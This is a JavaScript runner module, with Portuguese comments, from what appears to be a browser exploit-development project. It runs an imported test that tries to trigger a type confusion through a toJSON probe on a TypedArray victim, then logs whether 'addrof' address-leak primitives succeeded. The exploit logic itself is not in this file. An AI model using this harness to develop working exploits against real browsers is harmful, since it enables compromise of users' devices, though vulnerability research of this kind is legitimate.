// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_RestoreMultiCallAndTargetThis,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_RestoreMultiCallAndTargetThis";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (RestoreMultiCallAndTargetThis) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_RestoreMultiCallAndTargetThis(); 

    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`   Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis)}`, "dev_verbose");
    }
    
    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-RMCT) ERR: ${result.errorOccurred.name}`;
        if (result.errorOccurred.name === 'TypeError' && result.errorOccurred.message.includes("circular structure")) {
             logS3(`     NOTA: TypeError de estrutura circular ocorreu, o que pode ser esperado se objetos foram atribuídos a 'details_of_last_confused_probe'.`, "info");
        }
    } else {
        logS3(`   RESULTADO: Completou. Detalhes da última sonda confusa (se encontrada): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A (Nenhuma sonda confusa adequada encontrada ou erro)'}`, "good", FNAME_RUNNER);
        logS3(`   Stringify Output (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
        
        let heisenbugConfirmed = false;
        if (result.toJSON_details && 
            result.toJSON_details.this_type === "[object Object]" &&
            result.toJSON_details.leaked_A_payload_set_on_this) { 
            heisenbugConfirmed = true;
        }

        let anyAddrofSuccess = false;
        if (result.addrof_A_result && result.addrof_A_result.success) {
             logS3(`     ADDROF A (from details) SUCESSO! ${result.addrof_A_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_A_result) {
             logS3(`     ADDROF A (from details) FALHOU: ${result.addrof_A_result.msg}`, heisenbugConfirmed ? "warn" : "error", FNAME_RUNNER);
        }
        if (result.addrof_B_result && result.addrof_B_result.success) {
             logS3(`     ADDROF B (from details) SUCESSO! ${result.addrof_B_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_B_result) {
             logS3(`     ADDROF B (from details) FALHOU: ${result.addrof_B_result.msg}`, heisenbugConfirmed ? "warn" : "error", FNAME_RUNNER);
        }

        if (result.toJSON_details && result.toJSON_details.error_in_probe) {
            logS3(`     ERRO INTERNO NA SONDA DE INTERESSE: ${result.toJSON_details.error_in_probe}`, "warn", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-RMCT) toJSON_ERR`;
        } else if (heisenbugConfirmed) {
            logS3(`     !!!! TYPE CONFUSION E ESCRITAS NO 'this' DA SONDA DE INTERESSE CONFIRMADAS !!!! Call #${result.toJSON_details.call_number}, Tipo: ${result.toJSON_details.this_type}`, "critical", FNAME_RUNNER);
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-RMCT) TC&Write OK, Addr Fail`;
            } else { 
                 document.title = `Heisenbug (TypedArray-RMCT) AddrFromDetails SUCCESS!`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT) || document.title.includes("Probing")) {
            if (!anyAddrofSuccess) {
                 document.title = `Heisenbug (TypedArray-RMCT) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (RestoreMultiCallTargetThis) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (RestoreMultiCallTargetThis) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCESSO") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("TC&Write OK")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V34_RMCT} Concluído`;
        }
    }
}
